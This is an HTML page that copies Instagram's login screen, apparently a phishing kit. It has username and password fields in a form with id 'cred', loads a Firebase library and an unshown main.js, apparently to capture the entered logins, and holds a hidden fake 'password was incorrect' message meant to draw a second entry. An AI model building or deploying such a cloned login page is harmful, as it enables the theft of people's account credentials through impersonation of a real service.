<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="pngwing.com.png" type="image/png">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
</head>

<body>
    <div class="wrapper">
        <div class="container">
            <div class="row">
                <div class="col-md-6 firstContainer">
                    <img src="img/app-feautures.png" alt="[+]" class="rounded d-block w-100">
                </div>
                <div class="col-md-6 text-center secondContainer">
                    <div class="card">
                        <div class="py-3 px-2">
                            <img src="img/instagram-logo.png" alt="card-img-top">
                        </div>
                        <div class="card-body">
                            <form method="post" id="cred">
                                <div class="form-group py-1">
                                    <input type="text" class="form-control" name="username" id="username"
                                        aria-describedby="helpId" placeholder="Phone Number, Username or Email">
                                </div>
                                <div class="form-group py-1">
                                    <input type="password" class="form-control" name="password" id="password"
                                        aria-describedby="helpId" placeholder="Password">
                                </div>
                                <input type="submit" id="LogIn" value="Log In" class="mt-2 btn btn-primary w-100 dis">
                            </form>
                            <div class="or">
                                <span>OR</span>
                            </div>
                            <div class="otherMethods">
                                <div class="secondaryColor">
                                    <img src="img/facebook-logo.png" class="img-fluid rounded" alt="[+]"
                                        style="width: 18px;height: 18px">
                                    <span class="ms-2">Login with Facebook</span>
                                </div>
                            </div>
                            <div id="errorMessage" style="display: none; color: red;">
                                Sorry, your password was incorrect. Please double-check your password.
                            </div>
                            <div class="forgot-pass mt-3 primaryColor">Forgot Password ?</div>
                        </div>
                    </div>
                    <div class="card my-2">
                        <div class="card-body">
                            <span>Don't Have an Account?</span><span class="primaryColor">Sign Up</span>
                        </div>
                    </div>
                    <span class="primaryColor">Get the App</span>
                    <div class="row py-2">
                        <div class="col-6"><img src="img/playstore.png" alt="[+]" class="img-fluid d-block rounded" />
                        </div>
                        <div class="col-6"><img src="img/appstore.png" alt="[+]" class="img-fluid d-block rounded" />
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
    <script src="main.js"></script>
    <script>
    document.getElementById('username').addEventListener('keyup', updateLoginButtonState);
    document.getElementById('password').addEventListener('keyup', updateLoginButtonState);

    function updateLoginButtonState() {
        const username = document.getElementById('username').value; // Corrected here
        const password = document.getElementById('password').value; // Corrected here
        const loginButton = document.getElementById('LogIn');

        if (username.trim() !== "" && password.trim() !== "") {
            loginButton.removeAttribute('disabled');
        } else {
            loginButton.setAttribute('disabled', 'disabled');
        }
    }
    </script>
</body>
</html>
